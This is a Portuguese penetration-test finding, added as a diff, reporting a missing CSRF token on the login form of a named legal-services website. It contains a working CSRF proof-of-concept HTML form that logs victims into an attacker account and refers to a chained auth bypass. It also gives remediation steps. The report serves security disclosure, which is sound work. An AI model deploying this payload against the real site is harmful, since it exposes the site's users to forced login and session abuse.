@@ -1,0 +1,31 @@
+F-005: Missing CSRF Token nos Formulários
+================================================================
+Severidade: MÉDIA
+Host: https://www.g7juridico.com.br
+Endpoint: /cadastro_incompleto.php (login)
+Data: 04/09/2026
+Classificação OWASP: A1 (Broken Access Control)
+
+DESCRIÇÃO
+----------
+O formulário de login não possui token CSRF. Combinado com o auth bypass
+(F-001), um atacante pode forçar uma vítima a fazer login (ou ter sua 
+sessão criada) via CSRF.
+
+REPRODUÇÃO
+----------
+  <!-- CSRF PoC -->
+  <form action="https://www.g7juridico.com.br/cadastro_incompleto.php" method="POST">
+    <input type="hidden" name="Email" value="atacante@evil.com">
+    <input type="hidden" name="senha" value="senha123">
+    <input type="hidden" name="acao" value="login">
+    <input type="submit" value="Submit">
+  </form>
+
+Não há token CSRF, captcha, ou qualquer proteção contra ataques de 
+cross-site request forgery.
+
+RECOMENDAÇÃO
+------------
+1. Implementar token CSRF único por sessão em todos os formulários
+2. Validar token no servidor antes de processar a requisição
